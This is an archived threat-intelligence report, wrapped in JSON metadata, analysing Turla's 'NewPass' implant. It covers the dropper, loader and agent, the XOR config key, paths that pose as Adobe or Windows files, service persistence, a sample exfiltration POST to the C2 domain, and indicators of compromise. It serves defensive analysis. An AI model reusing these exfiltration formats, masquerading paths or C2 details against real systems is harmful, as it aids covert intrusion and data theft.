{
    "id": "205be6b8-d679-474f-8af5-e63515abf1f3",
    "created_at": "2023-01-12T15:10:44.649668Z",
    "updated_at": "2025-03-27T02:16:20.926719Z",
    "deleted_at": null,
    "sha1_hash": "28db38f3b9c045668e3ac951ac5f2d079bb5e71a",
    "title": "2020-07-14 - Turla - Venomous Bear updates its arsenal- “NewPass” appears on the APT threat scene",
    "authors": "",
    "file_creation_date": "2022-05-28T23:32:11Z",
    "file_modification_date": "2022-05-28T23:32:11Z",
    "file_size": 1862192,
    "plain_text": "# Turla / Venomous Bear updates its arsenal: “NewPass” appears on the APT threat scene\n\n**[telsy.com/turla-venomous-bear-updates-its-arsenal-newpass-appears-on-the-apt-threat-scene/](https://www.telsy.com/turla-venomous-bear-updates-its-arsenal-newpass-appears-on-the-apt-threat-scene/)**\n\nJuly 14, 2020\n\n[Cyber Threat Intelligence](https://www.telsy.com/category/cyber-threat-intelligence/)\n14 Jul\n\n\n-----\n\nRecently Telsy observed some artifacts related to an attack that occurred in June 2020 that is most likely linked\n[to the popular Russian Advanced Persistent Threat (APT) known as Venomous Bear (aka Turla or Uroburos).](https://en.wikipedia.org/wiki/Advanced_persistent_threat)\nAt the best of our knowledge, this time the hacking group used a previously unseen implant, that we internally\nnamed “NewPass“ as one of the parameters used to send exfiltrated data to the command and control.\n\nTelsy suspects this implant has been used to target at least one European Union country in the sector of\ndiplomacy and foreign affairs.\n\n**_NewPass is quite a complex malware composed by different components that rely on an encoded file to pass_**\ninformation and configuration between each other. There are at least three components of the malware: a\ndropper, that deploys the binary file; a loader library, that is able to decode the binary file extracting the last\ncomponent, responsible for performing specific operations, such as communicate with the attackers’ command\nand control server (the “agent”)\n\nThe loader and the agent share a JSON configuration resident in memory that demonstrate the potential of the\nmalware and the ease with which the attackers can customize the implant by simply changing the configuration\nentries’ values.\n\n## Dropper Analysis\n\n\n-----\n\nThe first Windows library has a huge size, about 2.6 MB, and it is identified by the following hash:\n\n**Type** **Value**\n\nSHA256 e1741e02d9387542cc809f747c78d5a352e7682a9b83cbe210c09e2241af6078\n\nExploring the artifact using a static approach, it is possible to note that it exports a high number of functions, as\nshown in the following image.\n\nMost of the reported functions point to useless code and only LocalDataVer can be used as an entry point of\nthe DLL, therefore making it useful to understand the malicious behavior.\n\nAttackers used this trick likely to avoid sandbox analysis, as well as make manual analysis slightly harder.\nSandbox solutions, in fact, probably will try to execute a DLL file using rundll32.exe or regsvr32.exe utilities,\nusing “DllMain” or “DllRegisterServer” as an entrypoint function. In this case, both these functions cause the\ntermination of the program, without showing the real malware behavior.\n\nThe library’s aim is to deploy the backdoor and its configuration file under two different folders depending on\nattacker’s customization.\n\nAccording to what has been observed by our research team, the paths used in this case are the following:\n\n**Configuration Path** **Backdoor Path**\n\nProgramData\\Adobe\\ARM\\Reader_20.021.210_47.dat C:\\Program Files\n(x86)\\Adobe\\Acrobat Reader\nDC\\Reader\\lib3DXquery.dll\n\nProgramData\\WindowsHolographic\\SpatialStore\\HolographicSpatialStore.swid WindowsHolographicService.dll\n\nFor the second sample we weren’t able to retrieve its dropper. Therefore, it is possible to obtain the location of\nthe configuration file from which the backdoor tried to load the parameters, but not the exact location in which\nthe dropper deployed the implant artifact.\n\nFurthermore, the used paths are very stealthy and it is easy to confuse the artifacts as components of legitimate\nprograms, such as Adobe Reader or Windows Mixed Reality.\n\nIn particular, the path of the first sample is the same used by the legitimate Adobe Reader installation and\ntherefore the lib3DXquery.dll file matches up perfectly with the other Adobe components, making it almost\ntotally invisible.\n\n\n-----\n\nThe configuration file written, at first glance, seems to be totally encrypted and incomprehensible without\nanalyzing the next stage. The following image shows the configuration file in its raw form.\n\n## Loader Analysis\n\nThe retrieved backdoor implants are identified by the following hashes:\n\n**Name** **SHA256**\n\nlib3DXquery.dll 6e730ea7b38ea80f2e852781f0a96e0bb16ebed8793a5ea4902e94c594bb6ae0\n\nWindowsHolographicService.dll f966ef66d0510da597fec917451c891480a785097b167c6a7ea130cf1e8ff514\n\nOnce again, the libraries export several functions but only one is useful to execute their real payload.\n\n\n-----\n\nTo begin, the library checks the presence of the associated configuration file, if it does not exist, the backdoor\nterminates its execution. Vice versa, once found the file the malware starts to decode and read the current\nconfiguration.\n\nThe first 5 bytes of the file contains the size of the data to read starting from the 6th **bytes and which contains**\nthe first encoded information useful to allow the malware to load the entire configuration.\n\nAll the data retrieved in this first phase is encoded using a simple XOR algorithm with a fixed key 19 B9 20 5A\n**_B8 EF 2D A3 73 08 C1 53, hardcoded at the beginning of the function as represented in the following image._**\n\n\n-----\n\nSo, the malware reads the first 5 bytes and decodes it using the key, obtaining the number of the bytes it has to\nread to obtain the initial configuration.\n\nIn this specific case, from the decoded bytes it gets the value 00081.\n\nSo, it proceeds to read other next 81 bytes.\n\nDecoding these last ones with the usual key, it obtains a string composed by different parameters separated by\n“||”, as illustrated below.\n\n\n-----\n\nHowever, this is still not the final configuration used by the malware, but it contains only the parameters to load\nthe last malicious Windows library, named LastJournalx32.adf, containing the final agent.\n\nThis payload is hidden into the configuration file after a section of random bytes used by the attackers to change\nthe hash value of the file at every infection.\n\nDuring its activity, the loader decrypts and maintains in memory the complete configuration used during the\ninfection chain.\n\nIt consists of different JSON formatted structures that look like the following:\n\n_{_ _“RefreshToken”:””,_ _“NoInternetSleepTime”:”3600″,_ _“GetMaxSize”:”60000″,_ _“ClientId”:””,_\n_“DropperExportFunctionName”:”LocalDataVer”,_ _“Autorun”:”16″,_ _“ImgurImageDeletionTime”:”120″,_\n_“RecoveryServers”:[_ _],_ _“RunDllPath”:”%WinDir%\\\\System32″,_\n**_“AgentLoaderExportFunctionName”:”LocalDataVer”,_** _“Key”:”[…redacted…]”,_\n**_“AgentName”:”LastJournalx32.adf”,_** _“UserAgent”:””,_ _[…truncated…]_\n\nThe structure contains all the information necessary for the loader to correctly launch the final agent. Some of\nthese information are AgentFileSystemName, AgentExportName and AgentName.\n\nThe agent shares the same memory space of the loader, thus it is able to access to the same configuration and\nto extract the needed parameters, such as the object named Credentials. It also contains the domain name\n(newshealthsport[.]com) and the path (/sport/latest.php) of the command-and-control with which the agent\nwill communicate.\n\nFrom the configuration it is also possible to notice the version number of the malware, specifically it is 19.03.28\nfor the AgentLoader and 19.7.16 for the Agent.\n\nMoreover, the agent is identified by an ID addressed by the AgentID entry that is used during the\ncommunication with the C2 as identifier of the infected machine.\n\n\n-----\n\nThe configuration also embeds a specific structure for persistence mechanisms that appears as follow:\n\n_{_ _“Autoruns”: {_ _“Service”: {_ _“DisplayName”: “Adobe Update Module”,       “ServiceName”:_\n_“Adobe Update Module”,       “Enabled”: “true”_ _},     “TaskScheduler”: {_ _“Enabled”: “false”_\n_},     “Registry”: {_ _“Enabled”: “false”_ _},     “Policies”: {_ _“Enabled”: “false”_ _}_ _}_\n_}_\n\nThe implant supports different types of persistence mechanisms: through Service Manager, Task Scheduler,\nvia Registry Key or using Windows GPO.\n\nIn this specific case, attackers enabled the Service method that allows the malware to interact with\nthe SCManager to create a new service named Adobe Update Module pointing to the path of the loader.\n\n## Agent Analysis\n\nThe last payload is identified by the following hash:\n\n**Type** **Value**\n\nSHA256 08a1c5b9b558fb8e8201b5d3b998d888dd6df37dbf450ce0284d510a7104ad7f\n\nIt is responsible for exfiltrating information from the infected machine, sending it to the command-and-control\nand downloading new commands to be executed.\n\nTo make the communication with the C2 stealthier, the agent uses a set of keywords to separate the data within\na POST request. The keywords are specified by attackers during development phase.\n\nIn the analyzed case, they are the following:\n\n_dbnew_\n_contentname_\n_newpass_\n_passdb_\n_data_src_\n_server_login_\n_table_data_\n_token_name_\n_server_page_\n_targetlogin_\n\nSo, during the exfiltration phase, the HTTP requests appear as reported in the table below\n\n_POST /sport/latest.php HTTP/1.1_ _Content-Type: application/x-www-form-urlencoded_ _User-Agent: Mozilla/5.0_\n_(Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko_ _Host: newshealthsport. com_ _Content-Length:_\n_170_ _Connection: Keep-Alive_ **_newpass=[redacted]&server_page=[redacted]&passdb=_**\n\n_[redacted]&targetlogin=t&table_data=[redacted]_\n\nAll the values embedded into the request are encrypted, probably using one of the keys embedded into the\nprevious configuration. The algorithm used during the encryption phase is most probably a custom one.\n\nBelow, we report a simple scheme of the described infection chain, highlighting the three components of this\nnew threat: the dropper, the loader and the agent.\n\n\n-----\n\n## Persistence\n\nAs mentioned above, the malware is able to create services or tasks or to add registry keys to achieve\npersistence. In the analyzed case, the loader component is set to create a new Windows service, specifying its\npath location as ImagePath.\n\n## ATT&CK Matrix\n\n**Technique** **Tactic** **Description**\n\nT1204 Execution Threat actor relies upon specific actions by a user in order to gain execution\n\nT1060 Persistence Threat actor adds an entry to the “run keys” in the Registry or startup folder to\nallow the program will be executed when a user logs in\n\nT1053 Persistence Threat actor uses Windows Task Scheduler to schedule programs or scripts to\nbe executed at a date and time\n\nT1543 Persistence Adversaries create or modify Windows services to repeatedly execute malicious\npayloads as part of persistence\n\n\nT1073 Defense\nEvasion\n\nT1132 Command\nand control\n\nT1001 Command\nand Control\n\n\nPrograms specifies DLLs that are loaded at runtime\n\nCommand and control (C2) information is encoded using a standard data\nencoding system\n\nCommand and control (C2) communications are hidden in an attempt to make\nthe content more difficult to discover or decipher\n\n\nT1041 Exfiltration Threat actor relies on command and control infrastructure to exfiltrate data\n\n## Indicators of Compromise\n\n**Type** **Value**\n\nSHA256 e1741e02d9387542cc809f747c78d5a352e7682a9b83cbe210c09e2241af6078\n\nSHA256 6e730ea7b38ea80f2e852781f0a96e0bb16ebed8793a5ea4902e94c594bb6ae0\n\n\n-----\n\nSHA256 08a1c5b9b558fb8e8201b5d3b998d888dd6df37dbf450ce0284d510a7104ad7f\n\nSHA256 f966ef66d0510da597fec917451c891480a785097b167c6a7ea130cf1e8ff514\n\nDomain newshealthsport. com\n\nURL http://newshealthsport. com/sport/latest.php\n\nCheck other [cyber reports on our site.](https://www.telsy.com/category/cyber-threat-intelligence/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-07-14 - Turla - Venomous Bear updates its arsenal- “NewPass” appears on the APT threat scene.pdf"
    ],
    "report_names": [
        "2020-07-14 - Turla - Venomous Bear updates its arsenal- “NewPass” appears on the APT threat scene.pdf"
    ],
    "threat_actors": [
        {
            "id": "a97cf06d-c2e2-4771-99a2-c9dee0d6a0ac",
            "created_at": "2022-10-25T16:07:24.349252Z",
            "updated_at": "2025-03-27T02:02:10.184406Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "ATK 13",
                "Belugasturgeon",
                "Blue Python",
                "CTG-8875",
                "Group 88",
                "ITG12",
                "Iron Hunter",
                "Krypton",
                "Makersmark",
                "Operation Epic Turla",
                "Operation Moonlight Maze",
                "Operation Penguin Turla",
                "Operation Satellite Turla",
                "Operation Skipper Turla",
                "Operation Turla Mosquito",
                "Operation WITCHCOVEN",
                "Pacifier APT",
                "Pensive Ursa",
                "Popeye",
                "SIG15",
                "SIG2",
                "SIG23",
                "Secret Blizzard",
                "TAG-0530",
                "Turla",
                "UNC4210",
                "Venomous Bear",
                "Waterbug"
            ],
            "source_name": "ETDA:Turla",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "ATI-Agent",
                "AdobeARM",
                "Agent.BTZ",
                "Agent.DNE",
                "BigBoss",
                "COMpfun",
                "Chinch",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobra Carbon System",
                "ComRAT",
                "DoublePulsar",
                "EmPyre",
                "EmpireProject",
                "Epic Turla",
                "EternalBlue",
                "EternalRomance",
                "GoldenSky",
                "Group Policy Results Tool",
                "HTML5 Encoding",
                "HyperStack",
                "IcedCoffee",
                "IronNetInjector",
                "KSL0T",
                "Kapushka",
                "Kazuar",
                "KopiLuwak",
                "Kotel",
                "LOLBAS",
                "LOLBins",
                "LightNeuron",
                "Living off the Land",
                "Maintools.js",
                "Metasploit",
                "Meterpreter",
                "MiamiBeach",
                "Mimikatz",
                "MiniDionis",
                "Minit",
                "NBTscan",
                "NETTRANS",
                "NETVulture",
                "Neptun",
                "NetFlash",
                "NewPass",
                "Outlook Backdoor",
                "Penquin Turla",
                "Pfinet",
                "PowerShell Empire",
                "PowerShellRunner",
                "PowerShellRunner-based RPC backdoor",
                "PowerStallion",
                "PsExec",
                "PyFlash",
                "QUIETCANARY",
                "Reductor RAT",
                "RocketMan",
                "SMBTouch",
                "SScan",
                "Satellite Turla",
                "SilentMoon",
                "Sun rootkit",
                "TTNG",
                "TadjMakhal",
                "Tavdig",
                "TinyTurla",
                "TinyTurla Next Generation",
                "TinyTurla-NG",
                "Topinambour",
                "Tunnus",
                "Turla",
                "Turla SilentMoon",
                "TurlaChopper",
                "Uroburos",
                "Urouros",
                "WCE",
                "WITCHCOVEN",
                "WhiteAtlas",
                "WhiteBear",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Wipbot",
                "WorldCupSec",
                "XTRANS",
                "certutil",
                "certutil.exe",
                "gpresult",
                "nbtscan",
                "nbtstat",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8aaa5515-92dd-448d-bb20-3a253f4f8854",
            "created_at": "2024-06-19T02:03:08.147099Z",
            "updated_at": "2025-03-27T02:05:17.408118Z",
            "deleted_at": null,
            "main_name": "IRON HUNTER",
            "aliases": [
                "Belugasturgeon ",
                "Blue Python ",
                "CTG-8875 ",
                "ITG12 ",
                "KRYPTON ",
                "MAKERSMARK ",
                "Pensive Ursa ",
                "Secret Blizzard ",
                "Turla",
                "UAC-0003 ",
                "UAC-0024 ",
                "UNC4210 ",
                "Venomous Bear ",
                "Waterbug ",
                "ATK13 "
            ],
            "source_name": "Secureworks:IRON HUNTER",
            "tools": [
                " ComRAT",
                " Kazuar",
                " KopiLuwak",
                " LightNeuron",
                " Mosquito",
                " Nautilus",
                " Neuron",
                " Penquin",
                " PoisonFrog",
                " PyFlash",
                " Skipper",
                " Snake",
                " Tavdig",
                " TinyTurla",
                " Tunnus",
                "Carbon-DLL"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a97fee0d-af4b-4661-ae17-858925438fc4",
            "created_at": "2023-01-06T13:46:38.396415Z",
            "updated_at": "2025-03-27T02:00:02.823045Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Uroburos",
                "Hippo Team",
                "Pacifier APT",
                "MAKERSMARK",
                "ATK13",
                "UAC-0003",
                "IRON HUNTER",
                "Waterbug",
                "TAG_0530",
                "KRYPTON",
                "Popeye",
                "SIG23",
                "UAC-0144",
                "G0010",
                "Blue Python",
                "VENOMOUS Bear",
                "Group 88",
                "Pfinet",
                "ITG12",
                "UNC4210",
                "Secret Blizzard",
                "UAC-0024"
            ],
            "source_name": "MISPGALAXY:Turla",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d11c89bb-1640-45fa-8322-6f4e4053d7f3",
            "created_at": "2022-10-25T15:50:23.509601Z",
            "updated_at": "2025-03-27T02:00:55.487991Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Turla",
                "IRON HUNTER",
                "Group 88",
                "Waterbug",
                "WhiteBear",
                "Krypton",
                "Venomous Bear",
                "Secret Blizzard",
                "BELUGASTURGEON"
            ],
            "source_name": "MITRE:Turla",
            "tools": [
                "PsExec",
                "nbtstat",
                "ComRAT",
                "netstat",
                "certutil",
                "KOPILUWAK",
                "IronNetInjector",
                "LunarWeb",
                "Arp",
                "Uroburos",
                "PowerStallion",
                "Kazuar",
                "Systeminfo",
                "LightNeuron",
                "Mimikatz",
                "Tasklist",
                "LunarMail",
                "HyperStack",
                "NBTscan",
                "TinyTurla",
                "Penquin",
                "LunarLoader"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536244,
    "ts_updated_at": 1743041780,
    "ts_creation_date": 1653780731,
    "ts_modification_date": 1653780731,
    "files": {
        "pdf": "https://archive.orkl.eu/28db38f3b9c045668e3ac951ac5f2d079bb5e71a.pdf",
        "text": "https://archive.orkl.eu/28db38f3b9c045668e3ac951ac5f2d079bb5e71a.txt",
        "img": "https://archive.orkl.eu/28db38f3b9c045668e3ac951ac5f2d079bb5e71a.jpg"
    }
}